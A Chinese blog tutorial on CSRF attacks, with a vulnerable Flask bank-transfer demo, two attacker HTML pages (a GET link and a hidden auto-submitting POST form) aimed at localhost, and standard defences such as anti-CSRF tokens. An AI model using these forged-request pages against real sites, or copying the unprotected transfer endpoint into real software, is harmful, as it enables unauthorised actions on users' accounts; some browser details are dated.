Title: 浅谈CSRF攻击
Date: 2019-06-04 21:26
Author: PwnForWhat
Category: Tech
Tags: Web Security
Slug: 浅谈CSRF攻击
Status: published



> 跨过山和大海，伪装成熟悉的陌生人

### 什么是CSRF

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

### 有何危害

故事要从三天前说起，你是一个月薪3000的程序员，好不容易存够了20000打算更新自己的主机。

这天你在网吧上网，想抽烟（抽烟有害健康）。于是你登陆账户，打算从里面取100大洋。与此同时，一个网页吸引你的注意，硕大的“屠龙宝刀，点击就送”使你情不自禁地点击。点进去以后，你发现跳出的居然是转账页面。定睛一看，转入的居然还不是你的账号，金额是一万。你两眼发昏，陷入沉思。

为什么会发生这样的情况呢？我们来看看后台发生了什么：

首先，你登陆进去以后，cookie里会储存一个你的登陆信息，告诉服务器，你登陆了。



``` python
from flask import Flask
from flask import redirect, request, session, url_for

app = Flask(__name__)
app.secret_key = 'APPLE_suck5'

@app.route('/')
def hello():
      return 'Hello World'

@app.route('/login')
def login():
      session['logged_in'] = True
      return redirect(url_for('hello'))

@app.route('/transfer')
def transfer():
      bank_id = request.args.get('bank_id')
      money = request.args.get('money')
      if session.get('logged_in', None):
            if bank_id and money:
                  return f'You transfer {money}$ to bank id:{bank_id}'
            return 'bank id and money amount required'
      return 'Not Authenticated'

```

而屠龙宝刀网页中的按钮，直接请求了transfer，向攻击者的账户转钱，而由于你的登陆信息还在，服务器以为这个请求是你发出的（实际上的确是，但并非你主观上想发出）。

``` html
<!DOCTYPE html>
<html lang="en">
<head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <title>Document</title>
</head>
<body>
      <button><a href="http://127.0.0.1:8081/transfer?bank_id=4003&money=10000">屠龙宝刀，点击就送</a></button>
</body>
</html>
```

可是你仔细一想，这个敏感数据的修改，不应该用GET啊，这有问题。

那么，让我们把时间再次回到三天前，这次的转账页面用的是表单，POST的那种。 与此同时，一个网页吸引你的注意，硕大的“屠龙宝刀，点击就送”使你情不自禁地点击。还没来得及点击，你发现跳出的居然是转账页面。定睛一看，转入的居然还不是你的账号，金额是一万。你两眼发昏，陷入沉思。



明明使用的就是POST表单啊，为什么还是会出现问题 ?



我们不妨假设现在的转账函数变为这样：

``` python
@app.route('/transfer', methods=['POST', 'GET'])
def withdraw():
      if session.get('logged_in', None):
            bank_id = request.form.get('bank_id')
            money = request.form.get('money')
            if bank_id and money:
                  return f'You transfer {money}$ to bank id:{bank_id}'
      return render_template('index.html')
```

显而易见，我可以针对你的转账表单构造一个页面，使其在加载过程中提交一个POST请求，由于你的登录信息仍存储在cookie里面， 服务器以为这个请求是你发出的 ，最终达到邪恶的目的。

构建的页面：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <title>Document</title>
      <script type="text/javascript">
            function steal() {
                  form = document.getElementById('postForm');
                  form.submit()
            }
      </script>
</head>
<body onload="steal()">
      <button>屠龙宝刀，点击就送</button>
      <form method="POST" style="display: none" id="postForm" action="http://127.0.0.1:8081/transfer">
            <input type="hidden" name="bank_id" value="4003">
            <input type="hidden" name="money" value="10000">
      </form>
</body>
</html>
```

### 如何预防

**1. 尽量使用POST，限制GET**

GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。

当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。

**2. 浏览器Cookie策略**

IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。

PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存到内存里），Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）。

PS：另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。

**3. 加验证码**

验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。

**4. Referer Check**

Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。

但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。

**5. Anti CSRF Token**

现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。

例子：



1\. 用户访问某个表单页面。

2\. 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。

3\. 在页面表单附带上Token参数。

4\. 用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法

这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。

注意：

CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决。

> 预防手段摘抄自 [hyddd](https://www.cnblogs.com/hyddd/) 的博客园

